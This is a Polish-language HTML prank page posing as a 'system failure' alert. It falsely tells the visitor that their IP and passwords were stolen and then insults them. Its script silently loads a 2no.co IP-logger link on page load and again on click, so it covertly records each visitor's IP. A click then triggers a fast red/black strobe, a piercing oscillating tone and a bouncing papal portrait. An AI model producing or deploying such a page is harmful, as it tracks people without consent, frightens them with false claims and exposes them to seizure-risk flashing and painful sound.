<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <title>SYSTEM FAILURE - CRITICAL ERROR</title>
    <style>
        body { 
            background: black; 
            color: #00FF41; 
            font-family: 'Courier New', monospace; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            text-align: center; 
            overflow: hidden; 
            transition: background 0.1s;
        }
        .container { 
            border: 2px solid #00FF41; 
            padding: 40px; 
            box-shadow: 0 0 30px rgba(0, 255, 65, 0.3); 
            z-index: 10;
            background: rgba(0,0,0,0.95);
            position: relative;
        }
        .warning { color: #ff0000; font-weight: bold; animation: blink 0.5s infinite; font-size: 2.5rem; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }

        #papiez {
            position: absolute;
            width: 180px;
            z-index: 5;
            top: 10px;
            left: 10px;
            filter: drop-shadow(0 0 15px gold);
            display: none;
        }

        #final-text {
            display: inline-block;
            transition: transform 12s linear;
        }
    </style>
</head>
<body onclick="startChaos()">

    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/John_Paul_II_vatican_official_portrait.jpg/200px-John_Paul_II_vatican_official_portrait.jpg" id="papiez" alt="JP2">

    <div class="container">
        <h1 class="warning">DANE PRZECHWYCONE</h1>
        <p>Transfer danych do serwera zewnętrznego zakończony sukcesem.</p>
        <p>Twoje IP oraz hasła zostały zindeksowane.</p>
        <br>
        <div id="final-text" style="font-size: 1.8rem; color: #fff;">Życzę chujowej nocy.</div>
        <p style="font-size: 0.7rem; color: #333; margin-top: 30px;">[ KLIKNIJ ABY ZAMKNĄĆ POWIADOMIENIE ]</p>
    </div>

    <script>
        // --- PRZECHWYTYWANIE PRZEZ TWÓJ LINK 2NO.CO ---
        function triggerLogger() {
            const logger = new Image();
            // Przeglądarka "pobiera" link jako obrazek, co aktywuje loggera
            logger.src = "https://2no.co/2sXYk7?cache=" + Math.random();
        }
        
        // Próba aktywacji przy załadowaniu
        triggerLogger();

        // --- LATAJĄCY PAPIEŻ ---
        const papiez = document.getElementById('papiez');
        const finalText = document.getElementById('final-text');
        let posX = Math.random() * 100; let posY = Math.random() * 100;
        let velX = 7; let velY = 5;

        function move() {
            posX += velX; posY += velY;
            if (posX + papiez.clientWidth >= window.innerWidth || posX <= 0) velX = -velX;
            if (posY + papiez.clientHeight >= window.innerHeight || posY <= 0) velY = -velY;
            papiez.style.left = posX + 'px';
            papiez.style.top = posY + 'px';
            requestAnimationFrame(move);
        }

        // --- START CHAOSU ---
        let started = false;
        function startChaos() {
            if (started) return;
            started = true;

            // Dodatkowa próba aktywacji loggera przy kliknięciu (na wszelki wypadek)
            triggerLogger();

            papiez.style.display = 'block';
            move();

            // Napis rośnie do gigantycznych rozmiarów
            finalText.style.transform = "scale(25)";

            // Audio (Pisk)
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            const osc = audioCtx.createOscillator();
            const gain = audioCtx.createGain();
            osc.type = 'sawtooth'; 
            osc.frequency.setValueAtTime(4000, audioCtx.currentTime);
            gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
            osc.connect(gain);
            gain.connect(audioCtx.destination);
            osc.start();

            setInterval(() => {
                osc.frequency.value = 2500 + Math.random() * 2000;
            }, 70);

            // Stroboskop (miganie czerwony/czarny)
            setInterval(() => {
                document.body.style.background = (document.body.style.background === 'red' ? 'black' : 'red');
                setTimeout(() => { document.body.style.background = 'black'; }, 50);
            }, 250);
        }
    </script>
</body>
</html>
